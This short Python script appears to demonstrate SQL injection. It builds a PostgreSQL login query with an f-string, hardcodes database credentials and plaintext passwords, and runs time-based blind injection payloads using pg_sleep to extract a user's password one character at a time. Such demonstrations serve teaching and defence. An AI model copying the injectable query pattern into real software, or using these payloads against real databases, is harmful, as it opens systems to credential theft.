import psycopg
from psycopg.rows import dict_row


def dangerous_get_user(username: str, password: str):
    unsafe_query = f"SELECT username, email FROM users WHERE username = '{username}' AND password = '{password}';"
    with psycopg.connect(
        host='localhost',
        port=5432,
        dbname='postgres',
        user='postgres',
        password='pg_secret',
        row_factory=dict_row,
    ) as conn:
        with conn.cursor() as cur:
            cur.execute(unsafe_query)
            return cur.fetchall()


username = 'ebarakoji'
password = 'aH8)m"2TH(y'
results = dangerous_get_user(username, password)
print(results)  # get user using right password

toxic_username = "ebarakoji' AND (CASE WHEN SUBSTRING((SELECT password FROM users WHERE id = 1), 1, 1) = 'a' THEN pg_sleep(3) ELSE NULL END IS NULL) -- "
results = dangerous_get_user(
    toxic_username, ''
)  # sleeps 3 seconds, so the first character of password is 'a'
print(results)

toxic_username = "ebarakoji' AND (CASE WHEN SUBSTRING((SELECT password FROM users WHERE id = 1), 1, 1) = 'b' THEN pg_sleep(3) ELSE NULL END IS NULL) -- "
results = dangerous_get_user(
    toxic_username, ''
)  # does not sleep, so the first character of password is not 'b'
print(results)
